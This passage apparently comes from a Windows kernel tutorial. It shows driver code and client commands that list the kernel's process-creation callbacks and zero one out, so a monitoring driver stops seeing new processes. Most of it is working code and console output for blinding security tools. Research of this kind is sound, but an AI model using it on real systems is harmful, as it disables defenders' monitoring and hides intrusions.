The main tactics we can employ to disable a given callback is to simply zero out the entry in the corresponding callback array.  In the current example, NotSysmon.sys has a CreateProcessNotify callback, which is just printing the ImageFileName.

```
[+] Process Created: \??\C:\Windows\system32\svchost.exe (4032)
[+] Process Created: \??\C:\Windows\system32\DllHost.exe (1920)
[+] Process Created: \??\C:\Windows\system32\DllHost.exe (5840)
[+] Process Created: \??\C:\Windows\system32\svchost.exe (2324)
[+] Process Created: \??\C:\Windows\system32\notepad.exe (3268)
C:\RedOctober>Client.exe
[+] Opening handle to driver...success!
[+] Calling RED_ENUM_PROCESS_CALLBACKS...success!

[0] 0xFFFF8A897285266F (ntoskrnl.exe)
[1] 0xFFFF8A89729D7C6F (cng.sys)
[2] 0xFFFF8A8972EFFDEF (WdFilter.sys)
[3] 0xFFFF8A8972EFFE4F (ksecdd.sys)
[4] 0xFFFF8A89740F715F (tcpip.sys)
[5] 0xFFFF8A897414D73F (iorate.sys)
[6] 0xFFFF8A897414D88F (CI.dll)
[7] 0xFFFF8A897414DC1F (dxgkrnl.sys)
[8] 0xFFFF8A89785FC7AF (peauth.sys)
[9] 0xFFFF8A89790A1E1F (NotSysmon.sys)
```



We're already familiar with how the callback address looks in the debugger.

```
kd> dqs fffff802`590e1870
fffff802`590e1870  ffff8a89`7285266f
fffff802`590e1878  ffff8a89`729d7c6f
fffff802`590e1880  ffff8a89`72effdef
fffff802`590e1888  ffff8a89`72effe4f
fffff802`590e1890  ffff8a89`740f715f
fffff802`590e1898  ffff8a89`7414d73f
fffff802`590e18a0  ffff8a89`7414d88f
fffff802`590e18a8  ffff8a89`7414dc1f
fffff802`590e18b0  ffff8a89`785fc7af
fffff802`590e18b8  ffff8a89`790a1e1f  <- NotSysmon.sys
fffff802`590e18c0  00000000`00000000
fffff802`590e18c8  00000000`00000000
fffff802`590e18d0  00000000`00000000
fffff802`590e18d8  00000000`00000000
fffff802`590e18e0  00000000`00000000
fffff802`590e18e8  00000000`00000000
```



The most straightforward way to reference a particular callback is by its index.

```
#define RED_OCTOBER_ZERO_PROCESS_CALLBACK	CTL_CODE(RED_OCTOBER_DEVICE, 0x811, METHOD_NEITHER, FILE_ANY_ACCESS)

struct TargetCallback
{
    int Index;
};
```



If we want to remove the callback for NotSysmon, we can refer to it as index **9**.

```
if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(TargetCallback))
{
	status = STATUS_BUFFER_TOO_SMALL;
	DbgPrint("[!] STATUS_BUFFER_TOO_SMALL\n");
	break;
}

TargetCallback* target = (TargetCallback*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

if (target == nullptr)
{
	status = STATUS_INVALID_PARAMETER;
	DbgPrint("[!] STATUS_INVALID_PARAMETER\n");
	break;
}

// sanity check value
if (target->Index < 0 || target->Index > 64)
{
	status = STATUS_INVALID_PARAMETER;
	DbgPrint("[!] STATUS_INVALID_PARAMETER\n");
	break;
}

ULONG64 pspSetCreateProcessNotify = FindPspSetCreateProcessNotify(windowsVersion);

// iterate over until we hit target index
for (LONG i = 0; i < 64; i++)
{
	if (i == target->Index)
	{
		// correct index found
	}
}
```



Once we have the target address, we just write 0's into it.

```
if (i == target->Index)
{
	ULONG64 pCallback = pspSetCreateProcessNotify + (i * 8);
	*(PULONG64)(pCallback) = (ULONG64)0;

	break;
}
```



It's also useful at this point to start adding some command line options to the client to call the various IOCTLs.  For example:

```
if (strcmp(argv[1], "-l") == 0)
{
    ...
}
else if (strcmp(argv[1], "-r") == 0)
{
    ...
}
else
{
    printf("[!] Unknown option\n");
    return 1;
}
```



```
C:\RedOctober>Client.exe -l
[+] Opening handle to driver...success!
[+] Calling RED_OCTOBER_ENUM_PROCESS_CALLBACK...success!

[0] 0xFFFF8A897285266F (ntoskrnl.exe)
[1] 0xFFFF8A89729D7C6F (cng.sys)
[2] 0xFFFF8A8972EFFDEF (WdFilter.sys)
[3] 0xFFFF8A8972EFFE4F (ksecdd.sys)
[4] 0xFFFF8A89740F715F (tcpip.sys)
[5] 0xFFFF8A897414D73F (iorate.sys)
[6] 0xFFFF8A897414D88F (CI.dll)
[7] 0xFFFF8A897414DC1F (dxgkrnl.sys)
[8] 0xFFFF8A89785FC7AF (peauth.sys)
[9] 0xFFFF8A89790A1E1F (NotSysmon.sys)

C:\RedOctober>Client.exe -r 9
[+] Opening handle to driver...success!
[+] Calling RED_OCTOBER_ZERO_PROCESS_CALLBACK...success!

C:\RedOctober>Client.exe -l
[+] Opening handle to driver...success!
[+] Calling RED_OCTOBER_ENUM_PROCESS_CALLBACK...success!

[0] 0xFFFF8A897285266F (ntoskrnl.exe)
[1] 0xFFFF8A89729D7C6F (cng.sys)
[2] 0xFFFF8A8972EFFDEF (WdFilter.sys)
[3] 0xFFFF8A8972EFFE4F (ksecdd.sys)
[4] 0xFFFF8A89740F715F (tcpip.sys)
[5] 0xFFFF8A897414D73F (iorate.sys)
[6] 0xFFFF8A897414D88F (CI.dll)
[7] 0xFFFF8A897414DC1F (dxgkrnl.sys)
[8] 0xFFFF8A89785FC7AF (peauth.sys)
```



We can now launch applications and see they're no longer printed in WinDbg.